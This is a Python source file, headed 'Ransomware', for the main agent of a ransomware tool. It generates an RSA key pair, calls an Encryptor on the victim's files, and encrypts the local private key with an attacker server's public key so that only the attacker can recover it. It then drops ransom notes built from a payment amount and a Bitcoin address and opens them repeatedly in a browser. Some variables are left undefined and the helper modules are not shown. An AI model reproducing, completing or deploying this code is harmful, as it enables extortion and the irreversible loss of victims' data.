# Date: 11/03/2019
# Author: Mohamed
# Description: Ransomware

import os
import webbrowser
import lib.const as const
from lib.file import File
from lib.crypto import CryptoRSA
from lib.encryptor import Encryptor


server_RSA_public_key = SERVER_RSA_PUBLIC_KEY


class Agent:

    def __init__(self, server_RSA_public_key):
        self.server_RSA_public_key = server_RSA_public_key
        self.RSA_local_public_key, self.RSA_local_private_key = CryptoRSA.generate_keys()

    def write_key(self):

        # write key
        with open(const.ENCRYPTED_RSA_PRIVATE_KEY, 'wb') as f:

            chunk_size = 32
            data = self.RSA_local_private_key

            for n in range(0, len(data), chunk_size):
                _max = n + chunk_size
                _data = data[n:_max]

                _data_ = CryptoRSA.encrypt(_data, self.server_RSA_public_key)
                f.write(_data_)

    def create_readme(self):
        with open(const.README_NAME, 'wt', encoding='utf-8') as f:
            f.write(const.README_CONTENT.format(
                amount_of_money,
                btc_address
            ))

        with open(const.README_THOR_FOLDER, 'wt', encoding='utf-8') as f:
            f.write(const.README_CONTENT.format(
                amount_of_money,
                btc_address
            ))

    def open_file(self):
        webbrowser.open(const.README_NAME)
        webbrowser.open(const.README_THOR_FOLDER)

    def start(self):
        Encryptor(self.RSA_local_public_key).start()
        self.create_readme()
        self.write_key()
        [self.open_file() for _ in range(3)]


if __name__ == '__main__':
    Agent(server_RSA_public_key).start()
